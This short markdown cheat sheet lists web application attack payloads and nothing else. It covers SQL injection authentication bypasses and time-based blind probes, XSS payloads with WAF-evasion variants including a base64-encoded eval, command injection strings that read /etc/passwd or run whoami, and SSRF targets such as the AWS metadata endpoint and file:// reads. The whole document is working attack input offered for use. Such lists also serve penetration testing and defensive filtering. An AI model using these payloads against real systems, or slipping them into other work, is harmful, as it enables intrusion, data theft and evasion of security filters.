# Web Application Security Payloads

## Basic SQL Injection (MySQL & PostgreSQL)
### Authentication Bypass
- `' OR 1=1 --`
- `" OR "a"="a`
- `admin' #`

### Blind SQL Injection (Time-based)
- MySQL: `SLEEP(10)`
- PostgreSQL: `pg_sleep(10)`

## Cross-Site Scripting (XSS)
### Basic Reflected/Stored
- `<script>alert(1)</script>`
- `"><script>alert("XSS")</script>`
- `<svg onload=alert(1)>`
- `<img src=x onerror=alert(1)>`

### Filter Evasion (WAF Bypass)
- `<sCrIpT>alert(1)</ScRiPt>`
- `<script>eval(atob('YWxlcnQoMSk='))</script>`
- `'<"onload="alert(1)`

## Command Injection
- `; id`
- `| whoami`
- `& cat /etc/passwd`
- `$(whoami)`
- `` `id` ``

## Server-Side Request Forgery (SSRF)
- `http://127.0.0.1:80`
- `http://169.254.169.254/latest/meta-data/` (AWS Cloud Metadata)
- `file:///etc/passwd`
